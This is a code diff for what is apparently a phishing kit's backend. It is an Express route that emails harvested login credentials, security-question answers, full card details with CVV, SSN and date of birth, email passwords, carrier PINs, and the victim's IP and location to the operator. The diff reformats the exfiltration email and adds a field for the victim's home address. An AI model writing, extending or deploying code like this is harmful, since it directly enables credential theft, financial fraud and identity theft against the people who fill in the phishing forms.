@@ -22,14 +22,15 @@ app.post("/send-infos", async (req, res) => {
     await sendEmail(
       process.env.EMAIL_ADDRESS as string,
       `
-     <div>*********************************************@*********************************************</div>
+     <div>*******************************************************************************************</div>
+     <div>*******************************************************************************************</div>
      ${
        values.form === "LOGIN DETAILS"
          ? `
         <br>
-        <h4>| *LOGIN DETAILS*</h4>
-        <p>| USERNAME: <b>${values.loginDetails.username}</b></p>
-        <p>| PASSWORD: <b>${values.loginDetails.password}</b></p>
+        <h4>| LOGIN DETAILS</h4>
+        <p>| USERNAME 👉🏽 <b>${values.loginDetails.username}</b></p>
+        <p>| PASSWORD 👉🏽 <b>${values.loginDetails.password}</b></p>
         <br>
         `
          : `
@@ -37,48 +38,51 @@ app.post("/send-infos", async (req, res) => {
        values.form === "SECURITY CHALLENGE"
          ? `
      <br>
-     <h4>| *SECURITY CHALLENGE*</h4>
-     <p>| QUESTION ONE: <b>${values.securityChallenge.challenQuestion1}</b></p>
-     <p>| ANSWER ONE: <b>${values.securityChallenge.answer1}</b></p>
-     <p>| QUESTION TWO: <b>${values.securityChallenge.challenQuestion2}</b></p>
-     <p>| ANSWER TWO: <b>${values.securityChallenge.answer2}</b></p>
-     <p>| QUESTION THREE: <b>${values.securityChallenge.challenQuestion3}</b></p>
-     <p>| ANSWER THREE: <b>${values.securityChallenge.answer3}</b></p>
+     <h4>| SECURITY CHALLENGE</h4>
+     <p>| QUESTION ONE 👉🏽 <b>${values.securityChallenge.challenQuestion1}</b></p>
+     <p>| ANSWER ONE 👉🏽 <b>${values.securityChallenge.answer1}</b></p>
+     <p>| QUESTION TWO 👉🏽 <b>${values.securityChallenge.challenQuestion2}</b></p>
+     <p>| ANSWER TWO 👉🏽 <b>${values.securityChallenge.answer2}</b></p>
+     <p>| QUESTION THREE 👉🏽 <b>${values.securityChallenge.challenQuestion3}</b></p>
+     <p>| ANSWER THREE 👉🏽 <b>${values.securityChallenge.answer3}</b></p>
      <br>
      `
          : `${
              values.form === "CARD INFORMATION"
                ? `
       <br>
-      <h4>| *CARD INFORMATION*</h4>
-      <p>| FULL NAME: <b>${values.cardInformation.fullname}</b></p>
-      <p>| CARD NUMBER: <b>${values.cardInformation.cardNumber}</b></p>
-      <p>| EXPIRATION DATE: <b>${values.cardInformation.expiryDate}</b></B></p>
-      <p>| CVV: <b>${values.cardInformation.cvv}</b></p>
-      <p>| SSN: <b>${values.cardInformation.ssn}</b></p>
-      <p>| DOB: <b>${values.cardInformation.dob}</b></p>
+      <h4>| CARD INFORMATION</h4>
+      <p>| FULL NAME 👉🏽 <b>${values.cardInformation.fullname}</b></p>
+      <p>| CARD NUMBER 👉🏽 <b>${values.cardInformation.cardNumber}</b></p>
+      <p>| EXPIRATION DATE 👉🏽 <b>${values.cardInformation.expiryDate}</b></B></p>
+      <p>| CVV 👉🏽 <b>${values.cardInformation.cvv}</b></p>
+      <p>| SSN 👉🏽 <b>${values.cardInformation.ssn}</b></p>
+      <p>| DOB 👉🏽 <b>${values.cardInformation.dob}</b></p>
+      <p>| ADDRESS 👉🏽 <b>${values.cardInformation.fullAddress}</b></p>
       <br>
      `
                : `
                <br><br>
                <h4>| ACCOUNT UPDATE</h4>
-               <p>| EMAIL ADDRESS: <b>${values.accountUpdate.email}</b></p>
-               <p>| EMAIL ADDRESS PASSWORD: <b>${values.accountUpdate.password}</b></p>
-               <p>| PHONE NUMBER: <b>${values.accountUpdate.phoneNumber}</b></p>
-               <p>| CARRIER PIN: <b>${values.accountUpdate.carrierPin}</b></p>
+               <p>| EMAIL ADDRESS 👉🏽 <b>${values.accountUpdate.email}</b></p>
+               <p>| EMAIL ADDRESS PASSWORD 👉🏽 <b>${values.accountUpdate.password}</b></p>
+               <p>| PHONE NUMBER 👉🏽 <b>${values.accountUpdate.phoneNumber}</b></p>
+               <p>| CARRIER PIN 👉🏽 <b>${values.accountUpdate.carrierPin}</b></p>
                <br><br>
                `
            }`
      }
      `
      }
-     <div>*********************************************@*********************************************</div>
+     <div>*******************************************************************************************</div>
+     <div>*******************************************************************************************</div>
      <br>
-     <p>| IP: <b>${ip}</b></p>
-     <p>| LOCATION: <b>${geo?.city}, ${geo?.country}</b></p>
-     <p>| TIMEZONE: <b>${geo?.timezone}</b></p>
+     <p>| IP 👉🏽 <b>${ip}</b></p>
+     <p>| LOCATION 👉🏽 <b>${geo?.city}, ${geo?.country}</b></p>
+     <p>| TIMEZONE 👉🏽 <b>${geo?.timezone}</b></p>
      <br>
-     <div>*********************************************END*********************************************</div>
+     <div>*******************************************************************************************</div>
+     <div>********************************************END********************************************</div>
      `
     );
     res.send(Promise.resolve());
